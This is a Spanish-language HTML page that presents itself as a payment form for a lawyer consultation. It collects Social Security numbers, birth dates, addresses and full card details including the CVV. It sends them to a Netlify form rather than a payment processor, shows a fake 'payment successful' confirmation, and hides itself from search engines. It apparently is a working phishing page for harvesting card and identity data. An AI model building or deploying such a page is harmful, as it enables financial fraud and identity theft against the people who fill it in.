<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Consulta de Abogado - Realiza tu Pago</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: fadeInUp 0.8s ease-out;
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes slideInField {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes shine {
            0% {
                background-position: -1000px 0;
            }
            100% {
                background-position: 1000px 0;
            }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }

        @keyframes pulseGlow {
            0% {
                box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7);
            }
            70% {
                box-shadow: 0 0 0 10px rgba(74, 222, 128, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(74, 222, 128, 0);
            }
        }

        @keyframes ripple {
            0% {
                transform: scale(0);
                opacity: 1;
            }
            100% {
                transform: scale(4);
                opacity: 0;
            }
        }

        @keyframes spinIcon {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        h1 {
            text-align: center;
            color: white;
            margin-bottom: 30px;
            font-size: 28px;
            font-weight: 600;
            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
            animation: slideDown 0.6s ease-out;
        }
        
        .form-group {
            margin-bottom: 25px;
            position: relative;
            animation: slideInField 0.6s ease-out backwards;
        }

        .form-group:nth-child(1) { animation-delay: 0.1s; }
        .form-group:nth-child(2) { animation-delay: 0.2s; }
        .form-group:nth-child(3) { animation-delay: 0.3s; }
        .form-group:nth-child(4) { animation-delay: 0.4s; }
        .form-group:nth-child(5) { animation-delay: 0.5s; }
        .form-group:nth-child(6) { animation-delay: 0.6s; }
        .form-group:nth-child(7) { animation-delay: 0.7s; }
        .form-group:nth-child(8) { animation-delay: 0.8s; }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: rgba(255,255,255,0.9);
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 15px 20px 15px 50px;
            border: 2px solid rgba(255,255,255,0.2);
            border-radius: 12px;
            font-size: 16px;
            background: rgba(255,255,255,0.1);
            color: white;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            font-family: inherit;
            position: relative;
        }

        input::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            border-radius: 12px;
        }
        
        input::placeholder {
            color: rgba(255,255,255,0.6);
        }
        
        input:focus {
            outline: none;
            border-color: #4ade80;
            background: rgba(255,255,255,0.2);
            box-shadow: 0 0 20px rgba(74, 222, 128, 0.3), inset 0 0 10px rgba(74, 222, 128, 0.1);
            transform: translateY(-2px);
        }

        input.input-error {
            border-color: #ef4444 !important;
            box-shadow: 0 0 20px rgba(239, 68, 68, 0.3) !important;
            animation: shake 0.4s ease-in-out;
        }

        textarea {
            width: 100%;
            padding: 15px 20px 15px 50px;
            border: 2px solid rgba(255,255,255,0.2);
            border-radius: 12px;
            font-size: 16px;
            background: rgba(255,255,255,0.1);
            color: white;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            font-family: inherit;
            resize: vertical;
        }

        textarea::placeholder {
            color: rgba(255,255,255,0.6);
        }

        textarea:focus {
            outline: none;
            border-color: #4ade80;
            background: rgba(255,255,255,0.2);
            box-shadow: 0 0 20px rgba(74, 222, 128, 0.3);
            transform: translateY(-2px);
        }




        
        .input-icon {
            position: absolute;
            left: 18px;
            top: 48px;
            color: rgba(255,255,255,0.6);
            font-size: 18px;
            z-index: 1;
        }
        
        .card-row {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 15px;
        }
        
        .card-row input {
            padding-left: 20px;
        }
        
        .card-icon { left: 15px !important; }
        .cvv-icon { left: 12px !important; }
        .exp-icon { left: 15px !important; }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #4ade80, #22c55e);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            animation: slideInField 0.6s ease-out 0.9s backwards;
        }

        .submit-btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.5);
            transform: translate(-50%, -50%);
            pointer-events: none;
        }

        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(74, 222, 128, 0.4), 0 0 20px rgba(74, 222, 128, 0.2);
        }

        .submit-btn:active {
            transform: translateY(-1px);
        }

        .submit-btn:active::before {
            animation: ripple 0.6s ease-out;
        }
        
        .success-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            animation: fadeInUp 0.3s ease-out;
            backdrop-filter: blur(5px);
        }
        
        .success-content {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            animation: bounceIn 0.6s ease-out;
        }
        
        @keyframes bounceIn {
            0% { transform: scale(0.3); opacity: 0; }
            50% { transform: scale(1.05); }
            70% { transform: scale(0.9); }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .success-icon {
            font-size: 60px;
            color: #22c55e;
            margin-bottom: 20px;
            animation: spinIcon 0.6s ease-out, pulseGlow 2s ease-in-out 0.6s;
        }

        .success-title {
            font-size: 24px;
            font-weight: 600;
            color: #1f2937;
            margin-bottom: 10px;
            animation: slideDown 0.5s ease-out 0.3s backwards;
        }

        .success-text {
            color: #6b7280;
            margin-bottom: 30px;
            animation: slideDown 0.5s ease-out 0.5s backwards;
        }
        
        .close-btn {
            background: #ef4444;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            animation: slideDown 0.5s ease-out 0.7s backwards;
        }

        .close-btn:hover {
            background: #dc2626;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3);
        }

        .close-btn:active {
            transform: translateY(0);
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
                margin: 10px;
            }
            
            .card-row {
                grid-template-columns: 1fr;
            }
            
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Payment Form -->
            <h1><i class="fas fa-credit-card"></i> Realiza tu Pago</h1>
            
<form id="paymentForm" name="payment" method="POST" netlify>
            <div class="form-group">
                <label for="nombre"><i class="fas fa-user"></i> Nombre</label>
                <i class="fas fa-user input-icon"></i>
                <input type="text" id="nombre" name="nombre" placeholder="Ingresa tu nombre" required>
            </div>
            
            <div class="form-group">
                <label for="apellido"><i class="fas fa-user-tag"></i> Apellido</label>
                <i class="fas fa-user-tag input-icon"></i>
                <input type="text" id="apellido" name="apellido" placeholder="Ingresa tu apellido" required>
            </div>
            
            <div class="form-group">
                <label for="correo"><i class="fas fa-envelope"></i> Correo Electrónico</label>
                <i class="fas fa-envelope input-icon"></i>
                <input type="email" id="correo" name="correo" placeholder="tu@email.com" required>
            </div>
            
            <div class="form-group">
                <label for="telefono"><i class="fas fa-phone"></i> Teléfono</label>
                <i class="fas fa-phone input-icon"></i>
                <input type="tel" id="telefono" name="telefono" placeholder="XXX-XXX-XXXX" maxlength="14" required>
            </div>
            
            <div class="form-group">
                <label for="seguro_social"><i class="fas fa-id-card"></i> Seguro Social</label>
                <i class="fas fa-id-card input-icon"></i>
                <input type="text" id="seguro_social" name="seguro_social" placeholder="XXX-XX-XXXX" maxlength="11" required>
            </div>
            
            <div class="form-group">
                <label for="fecha_cumpleanos"><i class="fas fa-birthday-cake"></i> Fecha de Cumpleaños</label>
                <i class="fas fa-birthday-cake input-icon"></i>
                <input type="date" id="fecha_cumpleanos" name="fecha_cumpleanos" required>
            </div>
            
            <div class="form-group">
                <label for="direccion"><i class="fas fa-map-marker-alt"></i> Dirección</label>
                <i class="fas fa-map-marker-alt input-icon"></i>
                <input type="text" id="direccion" name="direccion" placeholder="Tu dirección completa" required>
            </div>
            
            <div class="form-group">
                <label for="ciudad"><i class="fas fa-city"></i> Ciudad</label>
                <i class="fas fa-city input-icon"></i>
                <input type="text" id="ciudad" name="ciudad" placeholder="Tu ciudad" required>
            </div>
            
            <div class="form-group">
                <label for="cp"><i class="fas fa-hashtag"></i> Código Postal</label>
                <i class="fas fa-hashtag input-icon"></i>
                <input type="text" id="cp" name="cp" maxlength="10" placeholder="Código postal" required>
            </div>
            
            <div class="form-group">
                <label><i class="fas fa-credit-card"></i> Información de Tarjeta</label>
                <div class="card-row">
                    <div style="position: relative;">
                        <i class="fas fa-credit-card card-icon input-icon"></i>
                        <input type="text" id="tarjeta" name="tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required>
                    </div>
                    <div style="position: relative;">
                        <i class="fas fa-lock cvv-icon input-icon"></i>
                        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
                    </div>
                    <div style="position: relative;">
                        <i class="fas fa-calendar exp-icon input-icon"></i>
                        <input type="text" id="expiracion" name="expiracion" placeholder="MM/AA" maxlength="5" required>
                    </div>
                </div>
            </div>
            
            <div class="form-group">
                <label for="nombre_tarjeta"><i class="fas fa-signature"></i> Nombre en Tarjeta</label>
                <i class="fas fa-signature input-icon"></i>
                <input type="text" id="nombre_tarjeta" name="nombre_tarjeta" placeholder="Como aparece en la tarjeta" required>
            </div>
            
            <button type="submit" class="submit-btn">
                <i class="fas fa-lock-open"></i> Realizar Pago
            </button>
        </form>
    </div>

    <!-- Modal de éxito -->
    <div id="successModal" class="success-modal">
        <div class="success-content">
            <div class="success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <div class="success-title">¡Pago Realizado Exitosamente!</div>
            <div class="success-text">Tu consulta ha sido programada. Recibirás una confirmación por correo electrónico en breve.</div>
            <button class="close-btn" onclick="closeModal()">Cerrar</button>
        </div>
    </div>

    <script>
        // Formateo automático para tarjeta
        document.getElementById('tarjeta').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
            let formatted = '';
            for (let i = 0; i < value.length; i += 4) {
                formatted += value.slice(i, i + 4) + ' ';
            }
            e.target.value = formatted.trim().slice(0, 19);
        });

        // Validación de correo electrónico
        document.getElementById('correo').addEventListener('input', function(e) {
            const email = e.target.value;
            if (email && !email.includes('@')) {
                e.target.classList.add('input-error');
            } else {
                e.target.classList.remove('input-error');
            }
        });

        // Validación para CVV - solo números
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });

        // Formateo para teléfono payment (XXX-XXX-XXXX)
        document.getElementById('telefono').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^\d]/g, '');
            let formatted = '';
            if (value.length >= 1) formatted += value.slice(0,3);
            if (value.length >= 4) formatted += '-' + value.slice(3,6);
            if (value.length >= 7) formatted += '-' + value.slice(6,10);
            e.target.value = formatted.slice(0,14);
        });

        // Formateo para seguro social (XXX-XX-XXXX)
        document.getElementById('seguro_social').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^\d]/g, '');
            let formatted = '';
            if (value.length >= 1) formatted += value.slice(0,3);
            if (value.length >= 4) formatted += '-' + value.slice(3,5);
            if (value.length >= 6) formatted += '-' + value.slice(5,9);
            e.target.value = formatted.slice(0,11);
        });

        // Formateo y validación para expiración MM/AA
        document.getElementById('expiracion').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^\d]/g, '');
            if (value.length >= 2) {
                let mes = parseInt(value.slice(0, 2));
                // Validar que el mes sea entre 01 y 12
                if (mes > 12) {
                    value = '12' + value.slice(2);
                }
                value = value.slice(0,2) + '/' + value.slice(2,4);
            }
            e.target.value = value.slice(0,5);
        });

        // Submit nativo Netlify Forms con validaciones
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const form = this;
            
            // Validar correo
            const correo = document.getElementById('correo').value;
            if (!correo.includes('@')) {
                alert('Por favor ingresa un correo válido con @');
                document.getElementById('correo').classList.add('input-error');
                return false;
            }
            
            // Validar MM/AA
            const expiracion = document.getElementById('expiracion').value;
            if (expiracion.length !== 5) {
                alert('Por favor completa la fecha de expiración (MM/AA)');
                return false;
            }
            
            const mes = parseInt(expiracion.slice(0, 2));
            const anio = parseInt(expiracion.slice(3, 5));
            
            if (mes < 1 || mes > 12) {
                alert('El mes debe estar entre 01 y 12');
                return false;
            }
            
            // Validar que todos los campos requeridos estén llenos
            const campos = ['nombre', 'apellido', 'correo', 'direccion', 'ciudad', 'cp', 'tarjeta', 'cvv', 'expiracion', 'nombre_tarjeta', 'telefono', 'seguro_social', 'fecha_cumpleanos'];
            for (let campo of campos) {
                const input = document.getElementById(campo);
                if (!input.value.trim()) {
                    alert('Por favor completa todos los campos');
                    return false;
                }
            }
            
            // Validar teléfono
            const telefono = document.getElementById('telefono').value;
            if (telefono.replace(/[^0-9]/g, '').length < 10) {
                alert('Por favor ingresa un teléfono válido');
                return false;
            }
            
            // Validar tarjeta
            const tarjeta = document.getElementById('tarjeta').value.replace(/\s/g, '');
            if (tarjeta.length !== 16) {
                alert('La tarjeta debe tener 16 dígitos');
                return false;
            }
            
            // Validar CVV
            const cvv = document.getElementById('cvv').value;
            if (cvv.length < 3) {
                alert('El CVV debe tener 3 o 4 dígitos');
                return false;
            }
            
            // Si todas las validaciones pasan, mostrar modal y luego enviar a Netlify
            console.log('Todas las validaciones pasaron, mostrando modal y enviando a Netlify...');
            document.getElementById('correo').classList.remove('input-error');
            document.getElementById('successModal').style.display = 'flex';
            
            // Enviar el formulario a Netlify después de mostrar el modal
            setTimeout(() => {
                form.submit();
            }, 3000);
        });

        // Cerrar modal
        function closeModal() {
            document.getElementById('successModal').style.display = 'none';
        }

        // Cerrar modal clicando fuera
        document.getElementById('successModal').addEventListener('click', function(e) {
            if (e.target === this) closeModal();
        });
    </script>
</body>
</html>
